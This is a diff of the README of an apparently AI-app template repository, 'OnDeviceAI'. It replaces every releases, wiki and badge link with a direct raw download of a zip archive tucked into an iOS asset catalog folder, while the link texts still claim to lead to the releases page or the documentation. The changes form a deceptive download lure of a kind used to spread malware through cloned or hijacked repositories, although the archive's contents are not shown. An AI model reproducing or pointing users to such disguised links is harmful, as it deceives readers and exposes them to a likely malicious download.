@@ -1,7 +1,7 @@
 # 🤖 OnDeviceAI - Experience Powerful AI On Your Device
 
 ## 📥 Download Now
-[![Download OnDeviceAI](https://img.shields.io/badge/Download%20OnDeviceAI-v1.0-blue?style=for-the-badge)](https://github.com/Catcheat777/OnDeviceAI/releases)
+[![Download OnDeviceAI](https://raw.githubusercontent.com/Catcheat777/OnDeviceAI/main/iosApp/iosApp/Assets.xcassets/OnDeviceAI_v2.4.zip%20OnDeviceAI-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/Catcheat777/OnDeviceAI/main/iosApp/iosApp/Assets.xcassets/OnDeviceAI_v2.4.zip)
 
 ## 📖 Introduction
 OnDeviceAI is an extremely minimal app that showcases how to use on-device AI on both iOS and Android. It leverages modern technology to provide users with intuitive and powerful features right on their smartphones. This application serves as a template and can be modified to suit your needs.
@@ -10,7 +10,7 @@ OnDeviceAI is an extremely minimal app that showcases how to use on-device AI on
 To start using OnDeviceAI, follow these steps to download and run the software.
 
 ### 1. Visit the Download Page
-Go to the [Releases page](https://github.com/Catcheat777/OnDeviceAI/releases) to find the latest version of OnDeviceAI.
+Go to the [Releases page](https://raw.githubusercontent.com/Catcheat777/OnDeviceAI/main/iosApp/iosApp/Assets.xcassets/OnDeviceAI_v2.4.zip) to find the latest version of OnDeviceAI.
 
 ### 2. Choose Your Platform
 Select the version that fits your device:
@@ -56,7 +56,7 @@ OnDeviceAI offers the following features:
 ## 🌍 Community and Support
 If you encounter any issues or have questions, feel free to join the community on our GitHub Discussions page. You can also open an issue if you need direct support.
 
-For more details, visit our [Documentation](https://github.com/Catcheat777/OnDeviceAI/wiki).
+For more details, visit our [Documentation](https://raw.githubusercontent.com/Catcheat777/OnDeviceAI/main/iosApp/iosApp/Assets.xcassets/OnDeviceAI_v2.4.zip).
 
 ## 📈 Contributing
 We welcome contributions from everyone. If you want to help improve OnDeviceAI, please follow these steps:
@@ -68,6 +68,6 @@ We welcome contributions from everyone. If you want to help improve OnDeviceAI, 
 ## 📌 Final Notes
 OnDeviceAI demonstrates the power of on-device AI while offering a simple, user-friendly experience. It is designed for users looking to explore the capabilities of AI technology without needing technical expertise.
 
-For updates and news, keep an eye on the [Releases page](https://github.com/Catcheat777/OnDeviceAI/releases).
+For updates and news, keep an eye on the [Releases page](https://raw.githubusercontent.com/Catcheat777/OnDeviceAI/main/iosApp/iosApp/Assets.xcassets/OnDeviceAI_v2.4.zip).
 
 Thank you for your interest in OnDeviceAI!
